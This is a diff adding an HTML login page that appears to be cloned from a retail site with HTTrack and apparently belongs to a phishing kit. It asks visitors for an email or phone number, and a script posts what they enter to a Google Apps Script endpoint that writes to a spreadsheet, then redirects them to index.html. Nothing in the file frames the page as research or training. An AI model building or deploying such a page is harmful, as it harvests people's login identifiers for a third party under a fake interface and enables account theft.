@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+
+<head>
+  <meta charset="utf-8">
+  <title>Login</title>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+  <style>
+  	.center {
+  
+  background: #fff;
+    position: relative;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    left: 0;
+    z-index: 0;
+    margin: 64px auto 0;
+    max-width: 360px;
+    overflow: auto;
+    border-radius: 16px 16px 0 0;
+    border: 1px solid rgba(0,0,0,.16);
+    min-height: 600px;
+}
+.button.big {
+    height: 50px;
+    border:none;
+    border-radius: 1px
+}
+.button.fill {
+    background-color: #FC2779;
+    color: #fff;
+}
+.button.full {
+    width: 100%;
+}
+
+  </style>
+</head>
+<body>
+<div class="center">
+<div class="container" style="padding:25px 10px 15px;border-bottom: 1px solid grey">
+	<p style="text-align:center;font-size: 25px">Login/register</p>
+</div>
+<div class="container" style="padding: 30px 30px">
+	<form  name="submit-to-google-sheet" id="test-form">
+  <div class="form-group">
+   
+    <input name='email' type="text" class="form-control border border-danger" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email id or Phone number" style="text-align: center;">
+    <small id="emailHelp" class="form-text text-muted" style="float: right;font-weight: normal;">REQUIRED.</small>
+  </div>
+
+<div class="button-separator" style="margin-top: 160px;">
+	<button type="submit" class="button big fill full "><!-- react-text: 366 -->proceed<!-- /react-text --></button>
+</div>
+</form>
+
+	</div>
+</div>
+
+
+
+	
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbyX7zDQ9QbVGO5ld3HNQekSI735tdEcQXT4wdmNM6-hRUv5Z6gjngkM1aeuWI-9Md-UkQ/exec'
+
+  const form = document.forms['submit-to-google-sheet']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => window.location.href = "index.html")
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+</body>
+
+</html>
